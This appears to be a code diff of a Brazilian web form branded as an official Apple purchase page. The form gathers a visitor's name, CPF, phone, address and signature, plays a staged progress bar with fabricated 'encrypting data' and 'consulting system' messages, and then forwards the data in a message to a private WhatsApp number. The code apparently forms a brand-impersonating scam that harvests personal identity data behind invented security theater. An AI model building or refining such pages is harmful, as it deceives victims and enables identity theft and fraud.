@@ -188,10 +188,10 @@ function buscarCEP(){
  fetch(`https://viacep.com.br/ws/${cep}/json/`)
  .then(r=>r.json())
  .then(d=>{
-  document.getElementById("rua").value=d.logradouro||"";
-  document.getElementById("bairro").value=d.bairro||"";
-  document.getElementById("cidade").value=d.localidade||"";
-  document.getElementById("estado").value=d.uf||"";
+  rua.value=d.logradouro||"";
+  bairro.value=d.bairro||"";
+  cidade.value=d.localidade||"";
+  estado.value=d.uf||"";
  });
  }
 }
@@ -244,7 +244,7 @@ if(!assinatura){
  return;
 }
 
-// TELA PREMIUM
+// LOADING
 document.body.innerHTML = `
 <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#a855f7;font-family:sans-serif;">
 <div style="width:300px;">
@@ -256,44 +256,41 @@ document.body.innerHTML = `
 </div>
 
 <p id="porcentagem" style="text-align:center;">0%</p>
-
-<div id="status"></div>
+<p id="status" style="text-align:center;margin-top:15px;"></p>
 
 </div>
 </div>
 `;
 
+let progresso = 0;
+
 let etapas = [
- "Criptografando dados...",
- "Validando informações...",
- "Consultando sistema...",
- "Gerando contrato...",
- "Finalizando análise..."
+ {p:10, txt:"🔐 Criptografando dados..."},
+ {p:30, txt:"📄 Validando informações..."},
+ {p:55, txt:"📡 Consultando sistema..."},
+ {p:75, txt:"🧾 Gerando contrato..."},
+ {p:90, txt:"⚙️ Finalizando análise..."},
+ {p:100, txt:"✅ Concluído"}
 ];
 
-let progresso = 0;
-let etapaIndex = 0;
+let etapaAtual = 0;
 
 let intervalo = setInterval(()=>{
- progresso++;
 
- document.getElementById("barra").style.width = progresso + "%";
- document.getElementById("porcentagem").innerText = progresso + "%";
+progresso += 0.8;
 
- if(progresso % 20 === 0 && etapaIndex < etapas.length){
-   document.getElementById("status").innerHTML += `<p>✔ ${etapas[etapaIndex]}</p>`;
-   etapaIndex++;
- }
+barra.style.width = progresso + "%";
+porcentagem.innerText = Math.floor(progresso) + "%";
 
- if(progresso >= 100){
-   clearInterval(intervalo);
-   finalizarEnvio();
- }
+if(etapaAtual < etapas.length && progresso >= etapas[etapaAtual].p){
+ status.innerText = etapas[etapaAtual].txt;
+ etapaAtual++;
+}
 
-}, 40);
+if(progresso >= 100){
+ clearInterval(intervalo);
 
-// FINAL
-function finalizarEnvio(){
+setTimeout(()=>{
 
 let protocolo = gerarProtocolo();
 let codigo = gerarCodigo();
@@ -303,45 +300,29 @@ let mensagem = `📄 FORMALIZAÇÃO DE COMPRA - VERSUS APPLE OFICIAL
 Protocolo: ${protocolo}
 Código de validação: ${codigo}
 
-━━━━━━━━━━━━━━━━━━━━━━━
-👤 DADOS DO TITULAR
-Nome: ${nome}
+👤 Nome: ${nome}
 CPF: ${cpf}
-Nascimento: ${nascimento}
-E-mail: ${email}
 Telefone: ${telefone}
-Renda: ${renda}
 
-━━━━━━━━━━━━━━━━━━━━━━━
-📱 DADOS DA COMPRA
-Aparelho: ${aparelho}
-Vencimento: ${vencimento}
+📱 Aparelho: ${aparelho}
 
-━━━━━━━━━━━━━━━━━━━━━━━
-📍 ENDEREÇO PARA ENTREGA
+📍 Endereço:
+${rua}, ${numero} - ${bairro}
+${cidade}/${estado}
 CEP: ${cep}
-Rua: ${rua}, Nº ${numero}
-Bairro: ${bairro}
-Cidade: ${cidade}
-Estado: ${estado}
 
 Observações: ${observacao}
 
-━━━━━━━━━━━━━━━━━━━━━━━
-✍️ CONFIRMAÇÃO
-Assinatura digital: ${assinatura}
+Assinatura: ${assinatura}
 
-Cadastro finalizado com sucesso.
+Em instantes você receberá as instruções de compra do dispositivo.`;
 
-Em instantes você receberá as instruções de compra referentes ao dispositivo selecionado.
-`;
+window.location.href = "https://wa.me/5511944967694?text=" + encodeURIComponent(mensagem);
 
-let url = "https://wa.me/5511944967694?text=" + encodeURIComponent(mensagem);
-
-setTimeout(()=>{
- window.location.href = url;
-}, 800);
+},800);
 }
+
+},40);
 
 }
 </script>
